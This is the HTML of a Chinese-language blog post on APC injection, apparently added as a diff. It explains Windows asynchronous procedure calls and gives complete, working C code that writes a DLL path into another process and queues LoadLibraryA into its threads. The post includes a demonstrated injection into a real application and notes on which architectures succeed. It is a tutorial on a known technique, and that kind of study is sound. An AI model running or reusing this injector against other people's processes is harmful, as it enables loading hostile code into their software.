@@ -1,0 +1,215 @@
+<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>Hexo | Hexo</title><meta name="author" content="John Doe"><meta name="copyright" content="John Doe"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="APC注入1.什么是APCAPC是一种异步调用机制，用于在异步上下文中执行函数，分为用户态APC和内核态APC，本文只涉及到用户态。之所以有APC这个概念，是由于在线程执行过程中，其他线程无法干预当前执行线程(占用cpu)，如果需要干预当前执行线程的操作，就需要有一种让线程自身去调用的机制，windows实现了一种称之为APC的技术，这种技术可以通过插入队列(执行信息)让线程在一定条件下自己去调用">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Hexo">
+<meta property="og:url" content="https://e1ectr0nlc.github.io/2023/07/20/APC%E6%B3%A8%E5%85%A5/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="APC注入1.什么是APCAPC是一种异步调用机制，用于在异步上下文中执行函数，分为用户态APC和内核态APC，本文只涉及到用户态。之所以有APC这个概念，是由于在线程执行过程中，其他线程无法干预当前执行线程(占用cpu)，如果需要干预当前执行线程的操作，就需要有一种让线程自身去调用的机制，windows实现了一种称之为APC的技术，这种技术可以通过插入队列(执行信息)让线程在一定条件下自己去调用">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png">
+<meta property="article:published_time" content="2023-07-20T11:08:18.081Z">
+<meta property="article:modified_time" content="2023-07-24T07:10:17.427Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://e1ectr0nlc.github.io/2023/07/20/APC%E6%B3%A8%E5%85%A5/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: 'Copy successfully',
+    error: 'Copy error',
+    noSupport: 'The browser does not support'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: 'Just',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'Hexo',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2023-07-24 15:10:17'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+    win.getCSS = (url,id = false) => new Promise((resolve, reject) => {
+      const link = document.createElement('link')
+      link.rel = 'stylesheet'
+      link.href = url
+      if (id) link.id = id
+      link.onerror = reject
+      link.onload = link.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        link.onload = link.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(link)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 6.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">9</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">1</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">1</div></a></div><hr class="custom-hr"/></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><span id="blog-info"><a href="/" title="Hexo"><span class="site-name">Hexo</span></a></span><div id="menus"><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">No title</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2023-07-20T11:08:18.081Z" title="Created 2023-07-20 19:08:18">2023-07-20</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2023-07-24T07:10:17.427Z" title="Updated 2023-07-24 15:10:17">2023-07-24</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post View:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="APC注入"><a href="#APC注入" class="headerlink" title="APC注入"></a>APC注入</h1><h2 id="1-什么是APC"><a href="#1-什么是APC" class="headerlink" title="1.什么是APC"></a>1.什么是APC</h2><p>APC是一种异步调用机制，用于在异步上下文中执行函数，分为用户态APC和内核态APC，本文只涉及到用户态。之所以有APC这个概念，是由于在线程执行过程中，其他线程无法干预当前执行线程(占用cpu)，如果需要干预当前执行线程的操作，就需要有一种让线程自身去调用的机制，windows实现了一种称之为APC的技术，这种技术可以通过插入队列(执行信息)让线程在一定条件下自己去调用，这样就实现了异步操作。在使用APC进行注入之前，我们需要搞清楚异步和同步的概念。</p>
+<p>例如需要读取文件内容，在同步下执行</p>
+<img src="C:\Users\zzy\AppData\Roaming\Typora\typora-user-images\image-20230720183135824.png" alt="image-20230720183135824" style="zoom:67%;" />
+
+<p>在异步下读取文件可以同时进行</p>
+<img src="C:\Users\zzy\AppData\Roaming\Typora\typora-user-images\image-20230720183656346.png" alt="image-20230720183656346" style="zoom:67%;" />
+
+<hr>
+<h2 id="2-如何利用"><a href="#2-如何利用" class="headerlink" title="2.如何利用"></a>2.如何利用</h2><p>在每个进程中都有自己的APC队列，当一个线程将一个APC请求添加到进程的APC队列中时，这个请求将被异步地执行，也就是说，在进程的上下文中执行相应的函数，也就是回调函数。</p>
+<p>回调函数的触发条件：使用<code>SleepEx</code>,<code>signalObjectAndWait</code>、<code>WaitForMultioleObjectsEx</code>…..等等这些函数，将自己处于挂起状态才会触发。</p>
+<p>由以上信息我们就可以总结出APC注入的场景：</p>
+<ul>
+<li>必须是多线程程序</li>
+<li>必须会调用上述函数</li>
+</ul>
+<hr>
+<h2 id="3-注入方法的原理"><a href="#3-注入方法的原理" class="headerlink" title="3.注入方法的原理"></a>3.注入方法的原理</h2><p>①当被注入程序执行到等待函数时，产生软中断</p>
+<p>②此时线程会去调用APC队列中的回调函数</p>
+<p>③利用<code>QueueUserApc()</code>向APC队列中插入回调函数</p>
+<p>④接下来的操作与其他注入无异，把插入回调函数的地址改为<code>LoadLibrary()</code>，参数改为我们注入Dll的路径。</p>
+<p>需要注意的是我们需要使用进程的pid获取线程id，需要用到的函数</p>
+<p><code>CreateToolhelp32Snapshot</code></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">HANDLE <span class="title function_">CreateToolhelp32Snapshot</span><span class="params">(</span></span><br><span class="line"><span class="params">  [in] DWORD dwFlags,				<span class="comment">//使用TH32CS_SNAPTHREAD，在快照中包含系统中的所有线程</span></span></span><br><span class="line"><span class="params">  [in] DWORD th32ProcessID			<span class="comment">//为0表示当前进程</span></span></span><br><span class="line"><span class="params">)</span>;</span><br><span class="line"><span class="comment">//如果函数成功，它将返回指定快照的打开句柄。如果函数失败，它将返回 INVALID_HANDLE_VALUE。</span></span><br></pre></td></tr></table></figure>
+
+<p><code>Thread32First</code></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">BOOL <span class="title function_">Thread32First</span><span class="params">(</span></span><br><span class="line"><span class="params">  [in]      HANDLE          hSnapshot,		<span class="comment">//从上一次调用 CreateToolhelp32Snapshot 函数返回的快照的句柄。</span></span></span><br><span class="line"><span class="params">  [in, out] LPTHREADENTRY32 lpte			<span class="comment">//指向 THREADENTRY32 结构的指针（缓冲区）</span></span></span><br><span class="line"><span class="params">)</span>;</span><br><span class="line"><span class="comment">//查看第一个线程，将线程列表的第一个条目复制到缓冲区</span></span><br></pre></td></tr></table></figure>
+
+<p><code>Thread32Next</code></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">BOOL <span class="title function_">Thread32Next</span><span class="params">(</span></span><br><span class="line"><span class="params">  [in]  HANDLE          hSnapshot,			<span class="comment">//从上一次调用 CreateToolhelp32Snapshot 函数返回的快照的句柄</span></span></span><br><span class="line"><span class="params">  [out] LPTHREADENTRY32 lpte				<span class="comment">//指向 THREADENTRY32 结构的指针（缓冲区）</span></span></span><br><span class="line"><span class="params">)</span>;</span><br><span class="line"><span class="comment">//查看下一个线程，将线程列表的条目复制到缓冲区</span></span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="4-代码"><a href="#4-代码" class="headerlink" title="4.代码"></a>4.代码</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;TlHelp32.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">using namespace <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取对应进程Id的所有线程Id</span></span><br><span class="line">BOOL <span class="title function_">GetAllThreadIdByProcessId</span><span class="params">(DWORD dwPid, DWORD** ppThreadIdList, LPDWORD pThreadIdListLength)</span></span><br><span class="line">&#123;</span><br><span class="line">	DWORD dwThreadIdListLength = <span class="number">0</span>;			<span class="comment">//线程ID数组中当前的线程ID数量</span></span><br><span class="line">	DWORD dwThreadIdListMaxCount = <span class="number">2000</span>;		<span class="comment">//线程ID数组的最大容量</span></span><br><span class="line">	LPDWORD pThreadIdList = <span class="literal">NULL</span>;		<span class="comment">//存储线程ID的动态分配数组，通过调用VirtualAlloc分配内存</span></span><br><span class="line">	pThreadIdList = (LPDWORD)VirtualAlloc(<span class="literal">NULL</span>, dwThreadIdListMaxCount * <span class="keyword">sizeof</span>(DWORD), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);</span><br><span class="line">	<span class="keyword">if</span> (pThreadIdList == <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;[*] Create Thread Id Space Error!\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line">	RtlZeroMemory(pThreadIdList, dwThreadIdListMaxCount * <span class="keyword">sizeof</span>(DWORD));</span><br><span class="line">	THREADENTRY32 te32 = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	RtlZeroMemory(&amp;te32, <span class="keyword">sizeof</span>(te32));</span><br><span class="line">	te32.dwSize = <span class="keyword">sizeof</span>(te32);</span><br><span class="line">	HANDLE hThreadSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, <span class="number">0</span>);	<span class="comment">//创建系统中所有线程的快照</span></span><br><span class="line">	<span class="keyword">if</span> (hThreadSnapshot == <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;[*] Create Thread Snap Error!\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line">	BOOL bRet = Thread32First(hThreadSnapshot, &amp;te32);		<span class="comment">//遍历线程快照，获取每个线程的信息。</span></span><br><span class="line">	<span class="keyword">while</span> (bRet)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (te32.th32OwnerProcessID == dwPid)		<span class="comment">//通过比较线程所属进程ID(th32OwnerProcessID)与指定进程ID(dwPid)判断是否与指定进程匹配</span></span><br><span class="line">													<span class="comment">//如果匹配，则将线程ID te32.th32ThreadID 添加到线程ID数组中								</span></span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span> (dwThreadIdListLength &gt;= dwThreadIdListMaxCount)</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			pThreadIdList[dwThreadIdListLength++] = te32.th32ThreadID;</span><br><span class="line">		&#125;</span><br><span class="line">		bRet = Thread32Next(hThreadSnapshot, &amp;te32);</span><br><span class="line">	&#125;</span><br><span class="line">	*pThreadIdListLength = dwThreadIdListLength;			<span class="comment">//将线程ID数组的长度 dwThreadIdListLength 和指针 pThreadIdList </span></span><br><span class="line">	*ppThreadIdList = pThreadIdList;						<span class="comment">//分别赋值给传入的参数 pThreadIdListLength 和 ppThreadIdList，以便在函数外部访问线程ID数组。</span></span><br><span class="line">	<span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">char</span> szDllPath[] = <span class="string">&quot;F:\\code_py&amp;C\\vs2017\\injecte\\Dll1\\x64\\Release\\Dll1.dll&quot;</span>; <span class="comment">//Dll路径</span></span><br><span class="line">	DWORD dwPid = <span class="number">17532</span>;	<span class="comment">//线程pid</span></span><br><span class="line">	BOOL bRet;</span><br><span class="line">	LPDWORD pThreadIdList = <span class="literal">NULL</span>;</span><br><span class="line">	DWORD dwThreadIdListLength = <span class="number">0</span>;</span><br><span class="line">	bRet = GetAllThreadIdByProcessId(dwPid, &amp;pThreadIdList, &amp;dwThreadIdListLength);</span><br><span class="line">	<span class="keyword">if</span> (!bRet)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;[*] Get All Thread Id Error!\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// 打开进程</span></span><br><span class="line">	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPid);</span><br><span class="line">	<span class="keyword">if</span> (hProcess == <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;[*] Open Process Error!\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	DWORD dwDllPathLen = <span class="built_in">strlen</span>(szDllPath) + <span class="number">1</span>;</span><br><span class="line">	<span class="comment">// 申请目标进程空间，用于存储DLL路径</span></span><br><span class="line">	LPVOID lpBaseAddress = VirtualAllocEx(hProcess, <span class="literal">NULL</span>, dwDllPathLen, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);</span><br><span class="line">	<span class="keyword">if</span> (lpBaseAddress == <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;[*] VirtualAllocEx Error!\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	SIZE_T dwWriten = <span class="number">0</span>;</span><br><span class="line">	<span class="comment">// 把DLL路径字符串写入目标进程</span></span><br><span class="line">	WriteProcessMemory(hProcess, lpBaseAddress, szDllPath, dwDllPathLen, &amp;dwWriten);</span><br><span class="line">	<span class="keyword">if</span> (dwWriten != dwDllPathLen)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;[*] Write Process Memory Error!\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//获取LoadLibraryA的加载地址</span></span><br><span class="line">	LPVOID pLoadLibraryFunc = GetProcAddress(GetModuleHandle(<span class="string">&quot;kernel32.dll&quot;</span>), <span class="string">&quot;LoadLibraryA&quot;</span>);</span><br><span class="line">	<span class="keyword">if</span> (pLoadLibraryFunc == <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;[*] Get Func Address Error!\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	HANDLE hThread = <span class="literal">NULL</span>;</span><br><span class="line">	<span class="comment">// 倒序插入线程APC，可避免出现在插入时进程崩溃的现象</span></span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = dwThreadIdListLength - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--)</span><br><span class="line">	&#123;</span><br><span class="line">		HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, pThreadIdList[i]);</span><br><span class="line">		<span class="keyword">if</span> (hThread)</span><br><span class="line">		&#123;</span><br><span class="line">			QueueUserAPC((PAPCFUNC)pLoadLibraryFunc, hThread, (ULONG_PTR)lpBaseAddress);</span><br><span class="line">			CloseHandle(hThread);</span><br><span class="line">			hThread = <span class="literal">NULL</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot; Success\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (hProcess)</span><br><span class="line">	&#123;</span><br><span class="line">		CloseHandle(hProcess);</span><br><span class="line">		hProcess = <span class="literal">NULL</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (pThreadIdList)</span><br><span class="line">	&#123;</span><br><span class="line">		VirtualFree(pThreadIdList, <span class="number">0</span>, MEM_RELEASE);</span><br><span class="line">		pThreadIdList = <span class="literal">NULL</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	ExitProcess(<span class="number">0</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>随便找一个用户层程序试一下效果：</p>
+<p><img src="C:\Users\zzy\AppData\Roaming\Typora\typora-user-images\image-20230720200419281.png" alt="image-20230720200419281"></p>
+<p><img src="C:\Users\zzy\AppData\Roaming\Typora\typora-user-images\image-20230720200605080.png" alt="image-20230720200605080"></p>
+<p>可以看到测试的dll成功注入uTools程序中</p>
+<h2 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h2><p>经过测试，注入成功与否与程序的位数有关。</p>
+<p>目标程序为x64</p>
+<p>使用x64程序注入x64dll             成功</p>
+<p>使用x64程序注入x86dll    		 失败</p>
+<p>使用x86程序注入x86dll 			失败</p>
+<p>使用x86程序注入x64dll			 失败</p>
+<p>目标程序为x86</p>
+<p>使用x64程序注入x64dll             失败</p>
+<p>使用x64程序注入x86dll    		 失败</p>
+<p>使用x86程序注入x86dll 			成功</p>
+<p>使用x86程序注入x64dll			 失败</p>
+<p>若不放心使用电脑本身程序，可使用自定义的测试程序，如下</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc,<span class="type">char</span>* argv[])</span>&#123;</span><br><span class="line">	MessageBox(<span class="literal">NULL</span>,<span class="string">&quot;start&quot;</span>,<span class="string">&quot;tit&quot;</span>,MB_OK);</span><br><span class="line">	SleepEx(<span class="number">1000</span>*<span class="number">60</span>,TRUE);</span><br><span class="line">	MessageBox(<span class="literal">NULL</span>,<span class="string">&quot;end&quot;</span>,<span class="string">&quot;tit&quot;</span>,MB_OK);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
+
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="https://e1ectr0nlc.github.io">John Doe</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="https://e1ectr0nlc.github.io/2023/07/20/APC%E6%B3%A8%E5%85%A5/">https://e1ectr0nlc.github.io/2023/07/20/APC%E6%B3%A8%E5%85%A5/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2023/07/21/%E6%B3%A8%E5%86%8C%E8%A1%A8%E6%B3%A8%E5%85%A5/" title=""><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">Previous Post</div><div class="prev_info"></div></div></a></div><div class="next-post pull-right"><a href="/2023/07/18/%E8%BF%9C%E7%A8%8B%E7%BA%BF%E7%A8%8B%E6%B3%A8%E5%85%A5--%E7%AA%81%E7%A0%B4session0%E6%B3%A8%E5%85%A5/" title=""><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">Next Post</div><div class="next_info"></div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">John Doe</div><div class="author-info__description"></div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">9</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">1</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">1</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Catalog</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#APC%E6%B3%A8%E5%85%A5"><span class="toc-number">1.</span> <span class="toc-text">APC注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E4%BB%80%E4%B9%88%E6%98%AFAPC"><span class="toc-number">1.1.</span> <span class="toc-text">1.什么是APC</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E5%A6%82%E4%BD%95%E5%88%A9%E7%94%A8"><span 